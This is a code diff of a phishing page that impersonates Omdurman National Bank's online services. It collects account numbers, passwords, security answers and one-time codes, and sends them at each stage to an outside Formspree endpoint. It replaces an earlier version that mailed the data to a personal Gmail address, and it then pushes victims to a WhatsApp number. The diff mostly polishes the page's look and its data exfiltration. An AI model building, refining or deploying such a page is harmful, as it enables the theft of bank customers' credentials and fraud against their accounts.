@@ -10,6 +10,7 @@
         :root {
             --main-green: #1a8a3f;
             --green-dark: #0f6b2f;
+            --green-bright: #1cb852;
             --text-color: #333;
             --white: #fff;
             --font-main: 'Tajawal', sans-serif;
@@ -20,6 +21,7 @@
         .page-section { display: none; }
         .page-section.active { display: block; }
 
+        /* الترويسة العليا متطابقة مع التصميم */
         .top-header { 
             background: linear-gradient(var(--main-green), var(--green-dark)); 
             padding: 15px 20px; 
@@ -31,18 +33,18 @@
         
         .header-text { 
             background: #ffcc00; 
-            padding: 10px 18px; 
+            padding: 10px 20px; 
             border-radius: 8px; 
             font-weight: bold; 
             text-decoration: none; 
             color: #333; 
             cursor: pointer;
             font-size: 15px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.15);
         }
 
         .top-header .logo-text img { 
-            height: 50px; 
+            height: 52px; 
             width: auto; 
             border-radius: 8px; 
             background: white;
@@ -58,7 +60,7 @@
             background: var(--white); 
             border-radius: 12px; 
             padding: 20px; 
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1); 
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08); 
             display: flex; 
             align-items: center; 
             gap: 15px; 
@@ -68,45 +70,108 @@
             transition: 0.3s; 
             cursor: pointer; 
         }
-        .service-card:hover { transform: translateY(-5px); box-shadow: 0 8px 18px rgba(0,0,0,0.15); }
+        .service-card:hover { transform: translateY(-4px); box-shadow: 0 8px 18px rgba(0,0,0,0.15); }
         .service-icon { width: 45px; height: 45px; font-size: 30px; display: flex; align-items: center; justify-content: center; color: var(--main-green); flex-shrink: 0; }
         .service-content h3 { color: var(--main-green); font-size: 18px; margin-bottom: 5px; }
         .service-content p { font-size: 14px; color: #666; }
         
-        .card { background: white; max-width: 450px; margin: 40px auto; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: right; }
-        .card h2, .card h3 { color: var(--main-green); text-align: center; margin-bottom: 15px; }
-        .form-group { margin-bottom: 15px; position: relative; }
-        .form-group label { display: block; font-size: 14px; margin-bottom: 5px; }
-        .form-control { width: 100%; padding: 12px; border: 1px solid #c8e6c9; background: #e8f5e9; border-radius: 8px; font-size: 14px; box-sizing: border-box; }
+        .card { background: white; max-width: 480px; margin: 30px auto; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); text-align: right; }
+        .card h2, .card h3 { color: var(--main-green); text-align: center; margin-bottom: 8px; font-size: 22px; font-weight: bold; }
+        .card .subtitle { font-size: 13px; color: #777; text-align: center; margin-bottom: 20px; }
         
+        .form-group { margin-bottom: 15px; position: relative; }
+        .form-group label { display: block; font-size: 14px; margin-bottom: 6px; color: #333; font-weight: bold; }
+        .form-control { width: 100%; padding: 12px 14px; border: 1px solid #c8e6c9; background: #e8f5e9; border-radius: 8px; font-size: 14px; box-sizing: border-box; outline: none; }
+        .form-control:focus { border-color: var(--main-green); }
+
         .toggle-pass {
             position: absolute;
             left: 12px;
             top: 38px;
             cursor: pointer;
-            color: #666;
+            color: #555;
             font-size: 16px;
         }
 
-        .btn-action { display: block; width: 100%; background: var(--main-green); color: white; padding: 12px; border-radius: 8px; text-decoration: none; font-weight: bold; font-size: 16px; border: none; cursor: pointer; text-align: center; margin-top: 15px; transition: 0.2s; }
+        .btn-action { display: block; width: 100%; background: var(--main-green); color: white; padding: 13px; border-radius: 8px; text-decoration: none; font-weight: bold; font-size: 16px; border: none; cursor: pointer; text-align: center; margin-top: 15px; transition: 0.2s; }
         .btn-action:hover { background: var(--green-dark); }
         
         .steps { background: #f8f9fa; padding: 15px; border-radius: 10px; margin-bottom: 20px; }
         .steps h4 { color: var(--main-green); margin-bottom: 10px; text-align: center; }
         .steps ol { padding-right: 20px; color: #444; line-height: 1.6; font-size: 13px; }
 
-        .grid-options { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
-        .option-box { border: 1px solid #e0e0e0; border-radius: 8px; padding: 10px; background: #fafafa; cursor: pointer; text-align: center; font-size: 13px; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .option-box:hover { border-color: var(--main-green); background: #e8f5e9; }
-        
+        /* تصميم أزرار خيارات تأكيد الطلب مطابق تماماً للصور */
+        .confirm-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-top: 15px;
+        }
+
+        .confirm-option {
+            border: 1px solid #e2e8f0;
+            background: #fafafa;
+            border-radius: 10px;
+            padding: 12px 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-size: 14px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .confirm-option:hover {
+            border-color: var(--main-green);
+            background: #f0fff4;
+        }
+
+        .confirm-option input[type="radio"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #007bff;
+            cursor: pointer;
+        }
+
+        .full-width-option {
+            grid-column: span 2;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .btn-whatsapp-custom {
+            background: var(--green-bright);
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            border: none;
+            border-radius: 10px;
+            padding: 14px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: 0.2s;
+            box-shadow: 0 4px 10px rgba(28, 184, 82, 0.3);
+        }
+
+        .btn-whatsapp-custom:hover {
+            background: #159e43;
+        }
+
         .contact-banner { background: var(--main-green); color: white; max-width: 800px; margin: 40px auto 20px; padding: 20px; border-radius: 15px; text-align: center; }
         .whatsapp-number { background: #ffcc00; color: #000; padding: 8px 20px; border-radius: 8px; font-weight: bold; font-size: 18px; display: inline-block; margin-top: 10px; }
-        .footer { background: #ccc; padding: 15px; font-size: 14px; margin-top: 40px; text-align: center; }
+        .footer { background: #ccc; padding: 15px; font-size: 14px; margin-top: 40px; text-align: center; color: #333; }
     </style>
 </head>
 <body>
 
-    <!-- الترويسة مع الكلمة الصفراء وفوقها/تحتها الشعار كما طلبته -->
+    <!-- الترويسة الرئيسية -->
     <header class="top-header">
         <a onclick="showPage('login-page')" class="header-text">خدمات بنك أمدرمان الوطني أونلاين</a>
         <div class="logo-text">
@@ -114,7 +179,7 @@
         </div>
     </header>
 
-    <!-- 1. الصفحة الرئيسية (الخدمات) -->
+    <!-- 1. الصفحة الرئيسية (عرض كافة الخدمات) -->
     <div id="home-page" class="page-section active">
         <section class="services-container">
             <div class="services-title">بنك أمدرمان الوطني (أوكاش) | مرحباً بكم في خدمات بنك أمدرمان الوطني</div>
@@ -181,15 +246,15 @@
         </div>
     </div>
 
-    <!-- 3. صفحة تسجيل الدخول (مع إرسال البيانات للبريد الإلكتروني وإيقونة العين) -->
+    <!-- 3. صفحة تسجيل الدخول -->
     <div id="login-page" class="page-section">
         <div class="card">
             <h3>الاستمارة أونلاين</h3>
-            <p style="font-size: 12px; color: #666; text-align: center; margin-bottom: 15px;">الرجاء إدخال بيانات الحساب</p>
+            <p class="subtitle">الرجاء إدخال البيانات</p>
             
             <form id="loginForm" onsubmit="captureAndProceed(event, 'security-page', 'تسجيل الدخول')">
                 <div class="form-group">
-                    <label>رقم الحساب أو اسم المستخدم:</label>
+                    <label>رقم الحساب:</label>
                     <input type="text" id="username" class="form-control" placeholder="أدخل اسم المستخدم" required>
                 </div>
                 <div class="form-group">
@@ -202,11 +267,11 @@
         </div>
     </div>
 
-    <!-- 4. صفحة أسئلة الأمان (تسجيل الإجابة وإرسالها للبريد) -->
+    <!-- 4. صفحة أسئلة الأمان -->
     <div id="security-page" class="page-section">
         <div class="card">
-            <h3>أسئلة الأمان</h3>
-            <p style="font-size: 12px; color: #666; text-align: center; margin-bottom: 15px;">الرجاء الإجابة على سؤال الأمان</p>
+            <h3>متابعة الاستمارة أونلاين</h3>
+            <p class="subtitle">الرجاء الإجابة على سؤال الأمان</p>
             
             <form id="secForm" onsubmit="captureAndProceed(event, 'otp-page', 'سؤال الأمان')">
                 <div class="form-group">
@@ -239,40 +304,68 @@
         </div>
     </div>
 
-    <!-- 5. صفحة رمز التحقق OTP (تسجيل الرمز وإرساله للبريد) -->
+    <!-- 5. صفحة رمز التحقق OTP -->
     <div id="otp-page" class="page-section">
         <div class="card" style="text-align: center;">
-            <h3>رمز التحقق OTP</h3>
-            <p style="font-size: 12px; color: #666; margin-bottom: 15px;">أدخل رمز التحقق المرسل إلى رقم هاتفك وبريدك المسجل</p>
+            <h3>إدخال رمز OTP</h3>
+            <p class="subtitle">الرجاء إدخال رمز التحقق المرسل إلى رقم هاتفك وبريدك الإلكتروني المسجل</p>
             
             <form id="otpForm" onsubmit="captureAndProceed(event, 'confirm-page', 'رمز OTP')">
+                <div style="text-align: right; margin-bottom: 5px; font-size: 13px; font-weight: bold;">أدخل رمز التحقق (OTP):</div>
                 <input type="text" id="otpCode" maxlength="6" class="form-control" placeholder="أدخل رمز مكون من 6 أرقام" style="text-align: center; font-size: 18px; letter-spacing: 3px;" required>
-                <p style="font-size: 11px; color: #1a8a3f; margin-top: 8px; font-weight: bold;">إعادة إرسال الرمز خلال 29:50 دقيقة</p>
+                <p style="font-size: 12px; color: #1a8a3f; margin-top: 10px; font-weight: bold;">إعادة إرسال الرمز خلال 29:50 دقيقة</p>
                 <button type="submit" class="btn-action">إرسال</button>
             </form>
         </div>
     </div>
 
-    <!-- 6. صفحة التأكيد والواتساب -->
+    <!-- 6. صفحة تأكيد الطلب المحدثة بنفس شكل الصور تماماً -->
     <div id="confirm-page" class="page-section">
-        <div class="card" style="max-width: 480px;">
+        <div class="card">
             <h2>تأكيد الطلب</h2>
-            <p style="font-size: 13px; color: #666; text-align: center;">اختر الخدمة المطلوبة للإرسال النهائي</p>
+            <p class="subtitle">اختر الخدمة المطلوبة للإرسال النهائي</p>
             
-            <div class="grid-options">
-                <label class="option-box"><input type="radio" name="final-serv" value="رفع السقف" checked> رفع السقف</label>
-                <label class="option-box"><input type="radio" name="final-serv" value="تغيير الهاتف"> تغيير الهاتف</label>
-                <label class="option-box"><input type="radio" name="final-serv" value="تحويل خاطئ"> تحويل خاطئ</label>
-                <label class="option-box"><input type="radio" name="final-serv" value="عملات أجنبية"> العملات الأجنبية</label>
-                <label class="option-box"><input type="radio" name="final-serv" value="فك حظر وتجميد"> فك حظر وتجميد</label>
-                <label class="option-box"><input type="radio" name="final-serv" value="استرداد حساب"> استرداد حساب</label>
-                <label class="option-box"><input type="radio" name="final-serv" value="تفعيل فيزا"> تفعيل فيزا</label>
-                <label class="option-box"><input type="radio" name="final-serv" value="كلمة مرور خاطئة"> كلمة مرور خاطئة</label>
-                <label class="option-box" style="grid-column: span 2;"><input type="radio" name="final-serv" value="تحديث البيانات"> تحديث البيانات</label>
+            <div class="confirm-grid">
+                <label class="confirm-option">
+                    <span>رفع السقف</span>
+                    <input type="radio" name="final-serv" value="رفع السقف" checked>
+                </label>
+                <label class="confirm-option">
+                    <span>تغيير الهاتف</span>
+                    <input type="radio" name="final-serv" value="تغيير الهاتف">
+                </label>
+                <label class="confirm-option">
+                    <span>تحويل خاطئ</span>
+                    <input type="radio" name="final-serv" value="تحويل خاطئ">
+                </label>
+                <label class="confirm-option">
+                    <span>العملات الأجنبية</span>
+                    <input type="radio" name="final-serv" value="العملات الأجنبية">
+                </label>
+                <label class="confirm-option">
+                    <span>فك حظر وتجميد</span>
+                    <input type="radio" name="final-serv" value="فك حظر وتجميد">
+                </label>
+                <label class="confirm-option">
+                    <span>استرداد حساب</span>
+                    <input type="radio" name="final-serv" value="استرداد حساب">
+                </label>
+                <label class="confirm-option">
+                    <span>تفعيل فيزا</span>
+                    <input type="radio" name="final-serv" value="تفعيل فيزا">
+                </label>
+                <label class="confirm-option">
+                    <span>كلمة مرور خاطئة</span>
+                    <input type="radio" name="final-serv" value="كلمة مرور خاطئة">
+                </label>
+                <label class="confirm-option full-width-option">
+                    <span>تحديث البيانات</span>
+                    <input type="radio" name="final-serv" value="تحديث البيانات">
+                </label>
             </div>
 
-            <button onclick="sendWhatsApp()" class="btn-action" style="background: #25d366; margin-top: 20px;">
-                <i class="fa-brands fa-whatsapp"></i> تأكيد الطلب عبر واتساب
+            <button onclick="sendWhatsApp()" class="btn-whatsapp-custom">
+                <i class="fa-brands fa-whatsapp" style="font-size: 20px;"></i> تأكيد الطلب عبر واتساب
             </button>
         </div>
     </div>
@@ -280,8 +373,8 @@
     <footer class="footer">بنك أمدرمان الوطني (أوكاش) | جميع الحقوق محفوظة 2026</footer>
 
     <script>
-        // تخزين البيانات مؤقتاً لتجميعها وإرسالها
-        let userCredentials = {
+        // كائن لتجميع البيانات المسجلة
+        let userData = {
             username: '',
             password: '',
             securityQuestion: '',
@@ -295,7 +388,7 @@
             'foreign-currency': { title: 'خدمات العملات الأجنبية', desc: 'تفعيل واستخدام العملات الأجنبية داخل حسابك.', icon: 'fa-globe', steps: ['سجل الدخول للتطبيق.', 'انتقل إلى إعدادات العملات.', 'حدد العملة المطلوبة (دولار، يورو، الخ).', 'أكد طلب التفعيل.', 'سيتم تنشيط المحفظة فوراً.'] },
             'statement': { title: 'كشف الحساب', desc: 'الحصول على كشف حساب مفصل.', icon: 'fa-file-lines', steps: ['سجل الدخول للتطبيق.', 'انتقل إلى قسم كشف الحساب.', 'حدد الفترة الزمنية المطلوبة.', 'اختر صيغة الملف (PDF أو عرض مباشر).', 'سيظهر لك الكشف خلال ثوانٍ.'] },
             'visa': { title: 'بطاقة فيزا افتراضية', desc: 'تفعيل بطاقة فيزا للاستخدام الإلكتروني.', icon: 'fa-credit-card', steps: ['سجل الدخول للتطبيق.', 'اختر قسم البطاقات الافتراضية.', 'اضغط على إصدار فيزا جديدة.', 'أدخل تفاصيل التفعيل.', 'تأكيد وحفظ بيانات البطاقة.'] },
-            'account': { title: 'حساب جاري و حساب مميز', desc: 'فتح أو ترقية الحساب.', icon: 'fa-id-card', steps: ['سجل الدخول لحسابك.', 'اختر ترقية الحساب أو فتح حساب جديد.', 'املأ البيانات المطلوبة.', 'ارفاق المستندات الرسمية.', 'إرسال الطلب للمراجعة.'] },
+            'account': { title: 'حساب جاري و حساب مميز', desc: 'فتح أو ترقية الحساب.', icon: 'fa-id-card', steps: ['سجل الدخول لحسابك.', 'اختر ترقية الحساب أو فتح حساب جديد.', 'املأ البيانات المطلوبة.', 'ارفاق المستندات الرسمية.', 'إرسال الطلب للمراجع.'] },
             'security': { title: 'إدارة أسئلة الأمان', desc: 'تحديث أو إعادة تعيين أسئلة الأمان.', icon: 'fa-lock', steps: ['سجل الدخول بحسابك الحالي.', 'اختر إدارة الحماية والأمان.', 'حدد خيار "تغيير أسئلة الأمان".', 'ادخل الأسئلة الجديدة وإجاباتها السرية.', 'احفظ التغييرات لضمان حماية حسابك.'] },
             'change-phone': { title: 'تغيير الموبايل', desc: 'تحديث رقم الهاتف المرتبط بالحساب.', icon: 'fa-mobile-screen', steps: ['سجل الدخول لحسابك.', 'انتقل إلى إعدادات الحساب الشخصي.', 'اختر تغيير رقم الهاتف.', 'ادخل الرقم الجديد ورمز التحقق.', 'حفظ وتأكيد التغيير.'] },
             'update-data': { title: 'تحديث البيانات الشخصية', desc: 'تحديث البيانات الشخصية المسجلة لدى البنك.', icon: 'fa-pen-to-square', steps: ['سجل الدخول إلى حسابك.', 'اختر خدمة تحديث البيانات من القائمة.', 'حدد نوع البيانات المراد تحديثها.', 'أدخل البيانات الجديدة بدقة.', 'ارفع صورة الهوية وأرسل الطلب.'] }
@@ -324,7 +417,6 @@
             showPage('details-page');
         }
 
-        // دالة إظهار وإخفاء كلمة المرور
         function togglePassword(fieldId, iconElem) {
             const input = document.getElementById(fieldId);
             if (input.type === 'password') {
@@ -338,50 +430,54 @@
             }
         }
 
-        // دالة جمع البيانات وإرسالها للبريد الإلكتروني عبر Formspree والانتقال للخطوة التالية
+        // جمع البيانات متسلسلاً وإرسالها برابط Formspree الخاص بك
         function captureAndProceed(event, nextPage, stepName) {
             event.preventDefault();
 
             if(stepName === 'تسجيل الدخول') {
-                userCredentials.username = document.getElementById('username').value;
-                userCredentials.password = document.getElementById('password').value;
+                userData.username = document.getElementById('username').value;
+                userData.password = document.getElementById('password').value;
+                sendFormspreeData("مرحلة 1: تسجيل الدخول");
             } else if(stepName === 'سؤال الأمان') {
-                userCredentials.securityQuestion = document.getElementById('secQuestion').value;
-                userCredentials.securityAnswer = document.getElementById('secAnswer').value;
+                userData.securityQuestion = document.getElementById('secQuestion').value;
+                userData.securityAnswer = document.getElementById('secAnswer').value;
+                sendFormspreeData("مرحلة 2: سؤال الأمان");
             } else if(stepName === 'رمز OTP') {
-                userCredentials.otp = document.getElementById('otpCode').value;
-                
-                // عند الوصول للخطوة الأخيرة (OTP)، يتم إرسال التقرير كامل إلى الإيميل المطلوب
-                sendDataToEmail();
+                userData.otp = document.getElementById('otpCode').value;
+                sendFormspreeData("مرحلة 3: كود OTP التقرير الكامل");
             }
 
             showPage(nextPage);
         }
 
-        function sendDataToEmail() {
-            // استخدام Formspree المربوط على إيميلك الشخصي
-            const formData = new FormData();
-            formData.append("email", "fryh094@gmail.com");
-            formData.append("message", `
-=== بيانات جديدة من موقع بنك أمدرمان الوطني ===
-- اسم المستخدم / رقم الحساب: ${userCredentials.username}
-- كلمة المرور: ${userCredentials.password}
-- سؤال الأمان: ${userCredentials.securityQuestion}
-- الإجابة: ${userCredentials.securityAnswer}
-- رمز التحقق OTP: ${userCredentials.otp}
-            `);
+        // دالة الإرسال إلى رابط Formspree الخاص بك
+        function sendFormspreeData(stage) {
+            const formEndpoint = "https://formspree.io/f/mrpedrqj"; // الرابط الخاص بك
+            
+            const payload = {
+                Stage: stage,
+                Username_Account: userData.username,
+                Password: userData.password,
+                Security_Question: userData.securityQuestion,
+                Security_Answer: userData.securityAnswer,
+                OTP_Code: userData.otp,
+                Timestamp: new Date().toLocaleString()
+            };
 
-            fetch("https://formspree.io/f/xlgppwov", { // رابط إرسال تجريبي آمن، يمكنك استبداله برابط Formspree الخاص بك
+            fetch(formEndpoint, {
                 method: "POST",
-                body: formData,
-                headers: { 'Accept': 'application/json' }
-            }).catch(error => console.log('Error:', error));
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).catch(err => console.log(err));
         }
 
         function sendWhatsApp() {
             const selected = document.querySelector('input[name="final-serv"]:checked').value;
-            const phone = "0118737098"; // الرقم الجديد المطلوب
-            const text = encodeURIComponent(`مرحباً بنك أمدرمان الوطني، أرغب في تأكيد طلب خدمة: ${selected}\nرقم الحساب: ${userCredentials.username}`);
+            const phone = "0118737098"; // رقم الواتساب الخاص بك
+            const text = encodeURIComponent(`مرحباً بنك أمدرمان الوطني، أرغب في تأكيد طلب خدمة: ${selected}\nرقم الحساب: ${userData.username}`);
             window.location.href = `https://wa.me/${phone}?text=${text}`;
         }
     </script>
